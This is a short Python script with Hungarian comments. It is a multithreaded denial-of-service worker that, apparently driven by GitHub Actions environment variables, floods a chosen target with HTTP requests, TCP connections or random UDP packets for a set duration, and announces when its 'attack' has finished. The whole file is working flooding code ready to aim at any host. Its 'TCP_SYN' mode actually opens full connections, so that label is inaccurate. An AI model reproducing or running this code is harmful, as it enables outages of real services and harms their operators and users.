import os
import time
import random
import socket
import requests

# A GitHub Action ezeket a környezeti változókat fogja átadni
METHOD = os.environ.get("METHOD", "HTTP_FLOOD")
TARGET = os.environ.get("TARGET", "127.0.0.1")
PORT = int(os.environ.get("PORT", 80))
DURATION = int(os.environ.get("DURATION", 60))
THREADS = int(os.environ.get("THREADS", 10))

print(f"Worker indult: {METHOD} -> {TARGET}:{PORT} ({DURATION}s, {THREADS}t)")

import threading

def worker():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            if METHOD == "HTTP_FLOOD":
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
                requests.get(f"http://{TARGET}:{PORT}/", headers=headers, timeout=1)
            elif METHOD == "TCP_SYN":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((TARGET, PORT))
                s.close()
            elif METHOD == "UDP_FLOOD":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random.randbytes(1400), (TARGET, PORT))
                s.close()
        except Exception:
            pass

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Worker befejezte a támadást.")
